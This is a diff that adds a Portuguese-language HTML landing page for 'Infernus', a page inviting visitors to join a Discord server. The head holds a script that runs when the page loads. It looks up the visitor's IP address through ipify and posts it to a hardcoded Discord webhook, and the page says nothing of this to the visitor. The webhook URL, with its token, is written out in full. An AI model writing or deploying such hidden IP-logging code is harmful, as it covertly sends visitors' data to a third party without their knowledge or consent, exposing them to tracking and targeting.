@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Infernus</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #121212;
+      color: #ffffff;
+      margin: 0;
+      padding: 0;
+    }
+    header {
+      background-color: #d32f2f;
+      color: #ffffff;
+      text-align: center;
+      padding: 1.5rem 0;
+    }
+    header h1 {
+      font-size: 2.5rem;
+      margin: 0;
+    }
+    main {
+      padding: 2rem;
+      text-align: center;
+    }
+    main h2 {
+      font-size: 2rem;
+      color: #ff5252;
+    }
+    main p {
+      font-size: 1rem;
+      color: #e0e0e0;
+      margin: 1rem 0;
+    }
+    a {
+      color: #ff5252;
+      text-decoration: none;
+      font-weight: bold;
+    }
+    a:hover {
+      text-decoration: underline;
+    }
+    footer {
+      background-color: #1c1c1c;
+      text-align: center;
+      padding: 1rem;
+      color: #757575;
+      position: fixed;
+      bottom: 0;
+      width: 100%;
+    }
+  </style>
+  <script>
+    // Captura o IP do visitante e envia para o Discord webhook
+    fetch('https://api64.ipify.org?format=json')
+      .then(response => response.json())
+      .then(data => {
+        console.log("IP capturado:", data.ip);
+
+        // Envia o IP capturado para o webhook do Discord
+        fetch("https://discord.com/api/webhooks/1315652080358133821/4eh5lzFoiBywOKvGOZE3LhbA8uazbhzqnqT__ZR0wNajHOlPvLPknG8AL1UJ5MRGN78Z", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            content: `IP capturado: ${data.ip}`
+          })
+        });
+      })
+      .catch(err => console.error("Erro ao capturar o IP:", err));
+  </script>
+</head>
+<body>
+  <header>
+    <h1>Infernus</h1>
+  </header>
+  <main>
+    <h2>Bem-vindo ao Infernus</h2>
+    <p>Para acessar o nosso servidor da Infernus, <a href="https://discord.gg/z2jvhJcD" target="_blank">clique aqui</a>.</p>
+  </main>
+  <footer>
+    <p>&copy; 2024 Infernus. Todos os direitos reservados.</p>
+  </footer>
+</body>
+</html>
